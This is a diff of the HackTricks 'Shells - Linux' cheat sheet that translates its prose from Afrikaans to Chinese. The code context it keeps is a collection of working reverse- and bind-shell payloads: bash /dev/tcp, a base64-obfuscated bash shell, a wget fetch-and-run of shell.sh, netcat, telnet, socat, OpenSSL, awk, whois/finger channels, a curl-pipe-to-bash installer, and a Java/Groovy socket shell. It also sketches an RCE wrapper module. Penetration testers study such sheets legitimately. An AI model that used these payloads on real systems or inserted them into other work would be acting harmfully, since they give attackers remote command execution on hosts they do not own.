@@ -1,25 +1,25 @@
 # Shells - Linux
 
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+学习和实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>支持 HackTricks</summary>
 
-* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 分享黑客技巧。
 
 </details>
 {% endhint %}
 
-**As jy vrae het oor enige van hierdie shells kan jy dit nagaan by** [**https://explainshell.com/**](https://explainshell.com)
+**如果你对这些 shell 有任何疑问，可以查看** [**https://explainshell.com/**](https://explainshell.com)
 
-## Volle TTY
+## Full TTY
 
-**Sodra jy 'n omgekeerde shell kry**[ **lees hierdie bladsy om 'n volle TTY te verkry**](full-ttys.md)**.**
+**一旦你获得了反向 shell**[ **请阅读此页面以获取完整 TTY**](full-ttys.md)**.**
 
 ## Bash | sh
 ```bash
@@ -34,9 +34,9 @@ exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; 
 #after getting the previous shell to get the output to execute
 exec >&0
 ```
-Moet nie vergeet om met ander shells te kyk nie: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, en bash.
+不要忘记检查其他 shell：sh、ash、bsh、csh、ksh、zsh、pdksh、tcsh 和 bash。
 
-### Simbool veilige shell
+### 符号安全 shell
 ```bash
 #If you need a more stable connection do:
 bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'
@@ -45,26 +45,26 @@ bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'
 #B64 encode the shell like: echo "bash -c 'bash -i >& /dev/tcp/10.8.4.185/4444 0>&1'" | base64 -w0
 echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMScK | base64 -d | bash 2>/dev/null
 ```
-#### Shell verduideliking
+#### Shell 解释
 
-1. **`bash -i`**: Hierdie deel van die opdrag begin 'n interaktiewe (`-i`) Bash-skal.
-2. **`>&`**: Hierdie deel van die opdrag is 'n afgekorte notasie vir **om beide standaarduitset** (`stdout`) en **standaardfout** (`stderr`) na die **dieselfde bestemming** te herlei.
-3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: Dit is 'n spesiale lêer wat **'n TCP-verbinding na die gespesifiseerde IP-adres en poort** verteenwoordig.
-* Deur **die uitset en foutstrome na hierdie lêer te herlei**, stuur die opdrag effektief die uitset van die interaktiewe skalsessie na die aanvaller se masjien.
-4. **`0>&1`**: Hierdie deel van die opdrag **herlei standaardinvoer (`stdin`) na die dieselfde bestemming as standaarduitset (`stdout`)**.
+1. **`bash -i`**: 该命令的这一部分启动一个交互式（`-i`）Bash shell。
+2. **`>&`**: 该命令的这一部分是一个简写符号，用于**将标准输出**（`stdout`）和**标准错误**（`stderr`）**重定向到相同的目的地**。
+3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: 这是一个特殊文件，**表示与指定IP地址和端口的TCP连接**。
+* 通过**将输出和错误流重定向到此文件**，该命令有效地将交互式shell会话的输出发送到攻击者的机器。
+4. **`0>&1`**: 该命令的这一部分**将标准输入（`stdin`）重定向到与标准输出（`stdout`）相同的目的地**。
 
-### Skep in lêer en voer uit
+### 创建文件并执行
 ```bash
 echo -e '#!/bin/bash\nbash -i >& /dev/tcp/1<ATTACKER-IP>/<PORT> 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh;
 wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.sh
 ```
 ## Forward Shell
 
-Wanneer jy met 'n **Remote Code Execution (RCE)** kwesbaarheid binne 'n Linux-gebaseerde webtoepassing werk, kan die verkryging van 'n reverse shell belemmer word deur netwerkverdedigings soos iptables-reëls of ingewikkelde pakketfiltermeganismes. In sulke beperkte omgewings behels 'n alternatiewe benadering die vestiging van 'n PTY (Pseudo Terminal) shell om meer effektief met die gecompromitteerde stelsel te kommunikeer.
+当处理基于Linux的Web应用程序中的**远程代码执行（RCE）**漏洞时，实现反向shell可能会受到网络防御的阻碍，例如iptables规则或复杂的数据包过滤机制。在这种受限环境中，另一种方法是建立一个PTY（伪终端）shell，以更有效地与被攻陷的系统进行交互。
 
-'n Aanbevole hulpmiddel vir hierdie doel is [toboggan](https://github.com/n3rada/toboggan.git), wat interaksie met die teikenomgewing vereenvoudig.
+为此推荐的工具是[toboggan](https://github.com/n3rada/toboggan.git)，它简化了与目标环境的交互。
 
-Om toboggan effektief te gebruik, skep 'n Python-module wat op die RCE-konteks van jou teikenstelsel aangepas is. Byvoorbeeld, 'n module genaamd `nix.py` kan as volg gestruktureer word:
+要有效使用toboggan，请创建一个针对目标系统RCE上下文的Python模块。例如，一个名为`nix.py`的模块可以结构如下：
 ```python3
 import jwt
 import httpx
@@ -88,21 +88,21 @@ response.raise_for_status()
 
 return response.text
 ```
-En dan kan jy uitvoer:
+然后，您可以运行：
 ```shell
 toboggan -m nix.py -i
 ```
-Om 'n interaktiewe skulp direk te benut. Jy kan `-b` byvoeg vir Burpsuite integrasie en die `-i` verwyder vir 'n meer basiese rce-wrapper.
+为了直接利用交互式 shell。您可以添加 `-b` 以进行 Burpsuite 集成，并移除 `-i` 以获得更基本的 rce 包装器。
 
-'n Ander moontlikheid bestaan uit die gebruik van die `IppSec` voorwaartse skulp implementering [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell).
+另一个可能性是使用 `IppSec` 的前向 shell 实现 [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell)。
 
-Jy moet net die volgende aanpas:
+您只需修改：
 
-* Die URL van die kwesbare gasheer
-* Die voorvoegsel en agtervoegsel van jou payload (indien enige)
-* Die manier waarop die payload gestuur word (koppe? data? ekstra inligting?)
+* 漏洞主机的 URL
+* 您的有效负载的前缀和后缀（如果有的话）
+* 有效负载发送的方式（头部？数据？额外信息？）
 
-Dan kan jy net **opdragte stuur** of selfs **die `upgrade` opdrag gebruik** om 'n volle PTY te verkry (let daarop dat pype met 'n ongeveer 1.3s vertraging gelees en geskryf word).
+然后，您可以直接 **发送命令**，甚至 **使用 `upgrade` 命令** 来获取完整的 PTY（注意管道的读取和写入大约有 1.3 秒的延迟）。
 
 ## Netcat
 ```bash
@@ -114,7 +114,7 @@ rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <ATTACKER-IP> <
 ```
 ## gsocket
 
-Kyk dit in [https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/)
+在 [https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/) 查看它
 ```bash
 bash -c "$(curl -fsSL gsocket.io/x)"
 ```
@@ -127,13 +127,13 @@ rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet <ATTACKER-I
 ```
 ## Whois
 
-**Aanvaller**
+**攻击者**
 ```bash
 while true; do nc -l <port>; done
 ```
-Om die opdrag te stuur, skryf dit neer, druk enter en druk CTRL+D (om STDIN te stop)
+要发送命令，请写下它，按回车，然后按CTRL+D（停止STDIN）
 
-**Slachtoffer**
+**受害者**
 ```bash
 export X=Connected; while true; do X=`eval $(whois -h <IP> -p <Port> "Output: $X")`; sleep 1; done
 ```
@@ -234,13 +234,13 @@ https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
 ```
 ## OpenSSL
 
-Die Aanvaller (Kali)
+攻击者 (Kali)
 ```bash
 openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
 openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
 openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
 ```
-Die Slachtoffer
+受害者
 ```bash
 #Linux
 openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
@@ -252,12 +252,12 @@ openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_cli
 
 [https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)
 
-### Bind shell
+### 绑定 shell
 ```bash
 victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
 attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337
 ```
-### Terugskakel
+### 反向 shell
 ```bash
 attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
 victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
@@ -266,15 +266,15 @@ victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
 ```bash
 awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
 ```
-## Vinger
+## Finger
 
-**Aanvaller**
+**攻击者**
 ```bash
 while true; do nc -l 79; done
 ```
-Om die opdrag te stuur, skryf dit neer, druk enter en druk CTRL+D (om STDIN te stop)
+要发送命令，请写下它，按回车，然后按CTRL+D（以停止STDIN）
 
-**Slachtoffer**
+**受害者**
 ```bash
 export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null')`; sleep 1; done
 
@@ -305,11 +305,11 @@ close(Service)
 ```
 ## Xterm
 
-Dit sal probeer om met jou stelsel te verbind op poort 6001:
+这将尝试在端口 6001 连接到您的系统：
 ```bash
 xterm -display 10.0.0.1:1
 ```
-Om die omgekeerde skulp te vang kan jy gebruik (wat op poort 6001 sal luister):
+要捕获反向 shell，您可以使用（将监听端口 6001）：
 ```bash
 # Authorize host
 xhost +targetip
@@ -318,14 +318,14 @@ Xnest :1
 ```
 ## Groovy
 
-deur [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) LET WEL: Java reverse shell werk ook vir Groovy
+由 [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) 注意：Java 反向 shell 也适用于 Groovy
 ```bash
 String host="localhost";
 int port=8044;
 String cmd="cmd.exe";
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
 ```
-## Verwysings
+## 参考文献
 
 * [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
 * [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell)
@@ -333,16 +333,16 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 * [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+学习和实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>支持 HackTricks</summary>
 
-* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **在** **Twitter** 🐦 **上关注我们** [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 分享黑客技巧。
 
 </details>
 {% endhint %}
